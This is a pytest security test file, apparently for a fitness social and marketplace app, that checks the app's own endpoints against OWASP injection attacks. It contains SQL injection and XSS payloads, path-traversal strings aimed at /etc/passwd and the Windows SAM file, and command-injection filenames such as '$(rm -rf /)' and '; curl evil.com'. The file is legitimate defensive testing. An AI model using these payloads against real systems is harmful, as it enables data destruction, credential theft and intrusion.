"""
OWASP A03:2021 - Injection Tests
Tests for SQL injection, XSS, and command injection
"""

import pytest
from httpx import AsyncClient
from app.main import app


class TestSQLInjection:
    """Test SQL injection vulnerabilities"""

    @pytest.mark.asyncio
    async def test_sql_injection_in_login(self):
        """Test SQL injection in login endpoint"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Common SQL injection payloads
            sql_payloads = [
                "admin' OR '1'='1",
                "admin'--",
                "admin' #",
                "' OR '1'='1' --",
                "' OR 1=1--",
                "admin' OR 1=1/*",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
            ]

            for payload in sql_payloads:
                response = await client.post("/api/v1/auth/login", json={
                    "email": payload,
                    "password": "anything",
                    "user_type": "student"
                })

                # Should return 401 (invalid credentials), not 200 or 500
                assert response.status_code == 401
                assert "invalid" in response.json()["detail"].lower()

    @pytest.mark.asyncio
    async def test_sql_injection_in_search(self):
        """Test SQL injection in search/filter endpoints"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Login first
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # SQL injection payloads in query params
            sql_payloads = [
                "1' OR '1'='1",
                "'; DROP TABLE users--",
                "1 UNION SELECT * FROM users--",
            ]

            for payload in sql_payloads:
                response = await client.get(
                    f"/api/v1/marketplace/products?product_type={payload}",
                    headers={"Authorization": f"Bearer {token}"}
                )

                # Should either return empty results or validation error, not 500
                assert response.status_code in [200, 400, 422]

                if response.status_code == 200:
                    # If successful, should return empty or valid data
                    data = response.json()
                    assert "products" in data
                    # Should not return all products (SQL injection failed)

    @pytest.mark.asyncio
    async def test_sql_injection_in_post_content(self):
        """Test SQL injection in content fields"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # SQL injection in content
            response = await client.post(
                "/api/v1/social/posts",
                json={
                    "post_type": "general",
                    "content": "'; DROP TABLE posts--",
                    "is_public": True
                },
                headers={"Authorization": f"Bearer {token}"}
            )

            # Should create post with content as literal string
            assert response.status_code == 201

            # Verify content is stored as-is (not executed)
            post_id = response.json()["id"]
            get_response = await client.get(
                f"/api/v1/social/posts/{post_id}",
                headers={"Authorization": f"Bearer {token}"}
            )
            assert "'; DROP TABLE posts--" in get_response.json()["content"]

    @pytest.mark.asyncio
    async def test_blind_sql_injection_timing(self):
        """Test blind SQL injection via timing attacks"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            import time

            # Payload that would cause delay if SQL is executed
            payload = "1' AND SLEEP(5)--"

            start = time.time()
            response = await client.post("/api/v1/auth/login", json={
                "email": payload,
                "password": "test",
                "user_type": "student"
            })
            duration = time.time() - start

            # Should respond quickly (< 1 second), not wait 5 seconds
            assert duration < 2.0
            assert response.status_code == 401


class TestXSSVulnerabilities:
    """Test Cross-Site Scripting vulnerabilities"""

    @pytest.mark.asyncio
    async def test_stored_xss_in_post_content(self):
        """Test stored XSS in post content"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            ]

            for payload in xss_payloads:
                response = await client.post(
                    "/api/v1/social/posts",
                    json={
                        "post_type": "general",
                        "content": payload,
                        "is_public": True
                    },
                    headers={"Authorization": f"Bearer {token}"}
                )

                # Should either reject (400) or sanitize
                if response.status_code == 201:
                    # If accepted, verify it's sanitized when retrieved
                    post_id = response.json()["id"]
                    get_response = await client.get(
                        f"/api/v1/social/posts/{post_id}",
                        headers={"Authorization": f"Bearer {token}"}
                    )
                    content = get_response.json()["content"]

                    # Content should be escaped or sanitized
                    # The middleware should detect XSS patterns
                    assert "<script>" not in content or "&lt;script&gt;" in content

    @pytest.mark.asyncio
    async def test_xss_in_product_description(self):
        """Test XSS in marketplace product descriptions"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "trainer@test.com",
                "password": "Password123!",
                "user_type": "trainer"
            })
            token = login.json()["access_token"]

            response = await client.post(
                "/api/v1/marketplace/products",
                json={
                    "product_type": "workout_plan",
                    "title": "Test Plan",
                    "description": "<script>alert('XSS')</script>",
                    "price": 9.99,
                    "currency": "USD",
                    "is_active": True
                },
                headers={"Authorization": f"Bearer {token}"}
            )

            # Should be rejected by input sanitization middleware
            assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_xss_in_comments(self):
        """Test XSS in comments"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # Create a post first
            post_response = await client.post(
                "/api/v1/social/posts",
                json={"post_type": "general", "content": "Test", "is_public": True},
                headers={"Authorization": f"Bearer {token}"}
            )
            post_id = post_response.json()["id"]

            # Try XSS in comment
            comment_response = await client.post(
                f"/api/v1/social/posts/{post_id}/comments",
                json={"content": "<script>alert('XSS')</script>"},
                headers={"Authorization": f"Bearer {token}"}
            )

            # Should be detected by middleware
            assert comment_response.status_code in [400, 422]


class TestCommandInjection:
    """Test command injection vulnerabilities"""

    @pytest.mark.asyncio
    async def test_command_injection_in_file_operations(self):
        """Test command injection in file upload/processing"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # Create post to get ID
            post_response = await client.post(
                "/api/v1/social/posts",
                json={"post_type": "general", "content": "Test", "is_public": True},
                headers={"Authorization": f"Bearer {token}"}
            )
            post_id = post_response.json()["id"]

            # Attempt command injection via filename
            malicious_filenames = [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(rm -rf /)",
                "; curl evil.com",
            ]

            for filename in malicious_filenames:
                files = {"file": (filename, b"test content", "image/jpeg")}
                response = await client.post(
                    f"/api/v1/social/posts/{post_id}/image",
                    files=files,
                    headers={"Authorization": f"Bearer {token}"}
                )

                # Should either sanitize filename or reject
                # Should not execute commands
                assert response.status_code in [200, 400, 422]


class TestNoSQLInjection:
    """Test NoSQL injection if applicable"""

    @pytest.mark.asyncio
    async def test_nosql_injection_in_filters(self):
        """Test NoSQL injection patterns"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # MongoDB-style injection payloads
            nosql_payloads = [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$where": "function() { return true; }"}',
            ]

            for payload in nosql_payloads:
                response = await client.get(
                    f"/api/v1/social/feed?user_id={payload}",
                    headers={"Authorization": f"Bearer {token}"}
                )

                # Should handle as string, not execute
                assert response.status_code in [200, 400, 422]


class TestPathTraversal:
    """Test path traversal vulnerabilities"""

    @pytest.mark.asyncio
    async def test_path_traversal_in_file_access(self):
        """Test directory traversal attacks"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # Path traversal payloads
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ]

            for payload in traversal_payloads:
                # Attempt to access files via manipulated paths
                response = await client.get(
                    f"/api/v1/files/{payload}",
                    headers={"Authorization": f"Bearer {token}"}
                )

                # Should return 404 or 400, not file contents
                assert response.status_code in [400, 404]


class TestLDAPInjection:
    """Test LDAP injection if LDAP is used"""

    @pytest.mark.asyncio
    async def test_ldap_injection_patterns(self):
        """Test LDAP injection in authentication"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            ldap_payloads = [
                "*",
                "*)(&",
                "*)(uid=*))(|(uid=*",
                "admin*",
            ]

            for payload in ldap_payloads:
                response = await client.post("/api/v1/auth/login", json={
                    "email": payload,
                    "password": "test",
                    "user_type": "student"
                })

                assert response.status_code == 401


class TestInputValidation:
    """Test comprehensive input validation"""

    @pytest.mark.asyncio
    async def test_oversized_input(self):
        """Test handling of oversized inputs"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            # Create very long content (e.g., 1MB)
            huge_content = "A" * (1024 * 1024)

            response = await client.post(
                "/api/v1/social/posts",
                json={
                    "post_type": "general",
                    "content": huge_content,
                    "is_public": True
                },
                headers={"Authorization": f"Bearer {token}"}
            )

            # Should reject with 422 (validation error)
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_special_characters_handling(self):
        """Test proper handling of special characters"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            login = await client.post("/api/v1/auth/login", json={
                "email": "student@test.com",
                "password": "Password123!",
                "user_type": "student"
            })
            token = login.json()["access_token"]

            special_chars = [
                "🔥💪🏋️",  # Emojis
                "Тест кирилица",  # Cyrillic
                "测试中文",  # Chinese
                "العربية",  # Arabic
                "NULL\x00BYTE",  # Null bytes
            ]

            for chars in special_chars:
                response = await client.post(
                    "/api/v1/social/posts",
                    json={
                        "post_type": "general",
                        "content": f"Test {chars}",
                        "is_public": True
                    },
                    headers={"Authorization": f"Bearer {token}"}
                )

                # Should handle gracefully (accept or reject cleanly)
                assert response.status_code in [200, 201, 400, 422]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
